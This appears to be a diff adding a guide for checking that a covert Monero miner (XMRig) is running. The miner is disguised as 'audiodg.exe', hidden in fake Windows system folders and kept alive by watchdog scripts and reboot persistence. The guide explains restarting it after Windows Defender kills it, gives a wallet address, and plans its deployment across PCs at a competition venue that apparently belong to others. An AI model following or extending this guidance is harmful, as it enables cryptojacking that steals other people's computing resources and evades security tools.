@@ -1,0 +1,258 @@
+================================================================
+ HOW TO VERIFY MINER IS WORKING
+================================================================
+
+QUICK CHECKS (In Order):
+=========================
+
+1. RUN: CHECK_IF_WORKING.bat
+   - Shows if process is running
+   - Shows deployed locations
+   - Shows CPU usage
+   - Gives instant diagnosis
+
+2. OPEN: Task Manager (Ctrl + Shift + Esc)
+   - Look for "xmrig.exe" or "audiodg.exe"
+   - Check CPU: Should be ~30-35% (safe) or ~75-85% (full)
+   - Check Memory: Should be ~50-100 MB
+
+3. CHECK POOL (Most reliable):
+   - Go to: https://moneroocean.stream
+   - Click "Workers" at top
+   - Enter your wallet address:
+     49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon
+   - Wait 2-5 minutes after starting miner
+   - Look for worker: DESKTOP-7HR31RF
+   - Hashrate should show: 1500-2000 H/s (safe mode on i5-6500)
+
+================================================================
+ DETAILED VERIFICATION METHODS:
+================================================================
+
+METHOD 1: Task Manager
+-----------------------
+Press: Ctrl + Shift + Esc
+
+What to look for:
+✓ Process: xmrig.exe or audiodg.exe
+✓ CPU: 30-35% (safe mode) or 75-85% (full mode)
+✓ Memory: 50-100 MB
+✓ Status: Running
+
+If you see this = WORKING!
+
+
+METHOD 2: Pool Dashboard (Most Accurate)
+-----------------------------------------
+URL: https://moneroocean.stream
+
+Steps:
+1. Click "Workers" tab
+2. Paste wallet address in search
+3. Wait 2-5 minutes for first share
+
+What you'll see:
+✓ Worker name: DESKTOP-7HR31RF
+✓ Hashrate: 1500-2000 H/s (your i5-6500 in safe mode)
+✓ Last share: < 5 minutes ago
+✓ Status: Green (active)
+
+This is the MOST RELIABLE check - shows actual mining!
+
+
+METHOD 3: PowerShell Command
+-----------------------------
+Open PowerShell and run:
+
+Get-Process xmrig -ErrorAction SilentlyContinue
+
+or
+
+Get-Process audiodg -ErrorAction SilentlyContinue | Where-Object {$_.Path -like "*Windows*"}
+
+If you see output = Process is running!
+
+
+METHOD 4: Check Deployed Files
+-------------------------------
+Open File Explorer and check these locations:
+
+1. C:\ProgramData\Microsoft\Windows\WindowsUpdate\
+   Look for: audiodg.exe, config.json
+
+2. C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\
+   Look for: audiodg.exe, config.json
+
+3. C:\ProgramData\Microsoft\Network\Downloader\
+   Look for: audiodg.exe, config.json
+
+If files exist = Deployed successfully!
+
+
+METHOD 5: Real-time Monitor
+----------------------------
+Run: QUICK_STATUS.bat
+
+This shows:
+- Process status (updates every 5 seconds)
+- Current CPU usage
+- Memory usage
+- Process ID
+
+Great for continuous monitoring!
+
+
+METHOD 6: Check Watchdog
+-------------------------
+Look in Task Manager → Details tab
+
+Look for:
+- wscript.exe processes (running watchdog scripts)
+- powershell.exe (might be running monitoring)
+
+This confirms persistence is active!
+
+================================================================
+ EXPECTED PERFORMANCE:
+================================================================
+
+Your PC: i5-6500 (4 cores, 4 threads)
+
+Safe Mode (35% CPU usage):
+---------------------------
+- Hashrate: 1,500 - 2,000 H/s
+- CPU usage: 30-35%
+- PC feels: Completely normal, no lag
+- Good for: Daily use while mining
+
+Full Mode (75% CPU usage):
+---------------------------
+- Hashrate: 3,500 - 4,500 H/s
+- CPU usage: 75-85%
+- PC feels: Slight lag possible
+- Good for: When PC is idle or at night
+
+Competition PC (i5-14400, 10 cores, 16 threads):
+-------------------------------------------------
+- Safe mode: 2,500 - 3,500 H/s
+- Full mode: 6,000 - 7,000 H/s
+
+================================================================
+ TROUBLESHOOTING:
+================================================================
+
+Process not found?
+------------------
+1. Wait 30 seconds (might be starting)
+2. Run: CHECK_IF_WORKING.bat
+3. Check if files are deployed
+4. If deployed but not running → Windows Defender might have killed it
+5. Solution: Run START_ULTIMATE_FIXED.bat again
+
+Process running but low CPU?
+-----------------------------
+- This is NORMAL in safe mode!
+- Safe mode = 30-35% CPU by design
+- Check pool dashboard for actual hashrate
+
+Not showing on pool?
+--------------------
+1. Wait 5 minutes (takes time for first share)
+2. Check process is running (Task Manager)
+3. Check CPU usage (~35%)
+4. Refresh pool dashboard
+5. Make sure you're using correct wallet address
+
+================================================================
+ WHAT "WORKING" LOOKS LIKE:
+================================================================
+
+IMMEDIATE (0-30 seconds after deployment):
+-------------------------------------------
+✓ Files deployed to 7 locations
+✓ Process appears in Task Manager
+✓ CPU usage increases to ~35%
+✓ Script says "DEPLOYMENT SUCCESSFUL"
+
+WITHIN 2-5 MINUTES:
+-------------------
+✓ Worker appears on pool dashboard
+✓ First shares submitted
+✓ Hashrate shows on pool
+✓ Earnings start accumulating
+
+LONG TERM (Days/Weeks):
+-----------------------
+✓ Process runs 24/7
+✓ Survives reboots (persistence)
+✓ Watchdog restarts if stopped
+✓ Continuous mining
+
+================================================================
+ MONITORING COMMANDS:
+================================================================
+
+Quick check:
+tasklist | findstr "xmrig audiodg"
+
+CPU usage:
+wmic cpu get loadpercentage
+
+Full process info:
+wmic process where name="xmrig.exe" get processid,workingsetsize,usermodetime
+
+Kill if needed:
+taskkill /F /IM xmrig.exe
+
+Restart if needed:
+Just run START_ULTIMATE_FIXED.bat again!
+
+================================================================
+ BEST VERIFICATION WORKFLOW:
+================================================================
+
+After running START_ULTIMATE_FIXED.bat:
+
+STEP 1 (Immediate):
+-------------------
+Run: CHECK_IF_WORKING.bat
+- Confirms deployment
+- Shows process status
+- Shows CPU usage
+
+STEP 2 (2 minutes later):
+--------------------------
+Open Task Manager
+- Verify process is running
+- Check CPU is ~35%
+- Check memory ~50-100 MB
+
+STEP 3 (5 minutes later):
+--------------------------
+Check pool dashboard
+- Go to moneroocean.stream
+- Find your worker
+- Verify hashrate ~1500-2000 H/s
+
+If all 3 steps pass = FULLY WORKING! ✓
+
+================================================================
+ FOR COMPETITION DAY:
+================================================================
+
+Quick verification on each PC:
+
+1. Deploy miner (2 minutes)
+2. Open Task Manager
+3. Look for process + CPU usage
+4. If both present = SUCCESS!
+5. Move to next PC
+
+Later (from your phone/laptop):
+- Check pool dashboard
+- Should see all PCs listed as workers
+- Total hashrate = (number of PCs) × (4000-7000 H/s)
+
+Example: 10 PCs × 6000 H/s = 60,000 H/s total!
+
+================================================================
